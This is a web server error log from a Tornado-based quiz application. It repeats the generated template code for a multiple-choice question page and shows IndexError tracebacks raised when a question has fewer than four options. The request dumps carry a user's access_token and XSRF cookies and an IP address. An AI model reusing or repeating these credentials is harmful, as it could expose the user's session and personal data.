  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505791a88e4c85783e2877b5&answers=%5B0%5D&cursor=6&_xsrf=c93f29dc84554be4a548722556f77501', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '86.134.38.179', 'Cookie': '__utma=188782963.1786246707.1347912966.1347912966.1347912966.1; __utmb=188782963.15.10.1347912966; __utmc=188782963; __utmz=188782963.1347912966.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _xsrf=c93f29dc84554be4a548722556f77501; access_token="QUFBRzZsTmNzNkdjQkFCTjZBM0RaQzdrYUNnVFBMZ0VjQTY5TEZHWENzUklFeE55TGlvelBaQ2psQktpT21rMWl3RFBBekI2cTd6RjY5S2E0N1pDcTQ0R0lSWkJCUGtUeEJEWkNGZG5QSWdBWkRaRA==|1347915824|c4f651f974d08b88a84101f047d2cd93f3478f3d"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 213.79ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505791a88e4c85783e2877b5&answers=%5B1%5D&cursor=16&_xsrf=c93f29dc84554be4a548722556f77501', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '93', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '86.134.38.179', 'Cookie': '__utma=188782963.1786246707.1347912966.1347912966.1347912966.1; __utmb=188782963.15.10.1347912966; __utmc=188782963; __utmz=188782963.1347912966.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _xsrf=c93f29dc84554be4a548722556f77501; access_token="QUFBRzZsTmNzNkdjQkFCTjZBM0RaQzdrYUNnVFBMZ0VjQTY5TEZHWENzUklFeE55TGlvelBaQ2psQktpT21rMWl3RFBBekI2cTd6RjY5S2E0N1pDcTQ0R0lSWkJCUGtUeEJEWkNGZG5QSWdBWkRaRA==|1347915824|c4f651f974d08b88a84101f047d2cd93f3478f3d"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 204.19ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
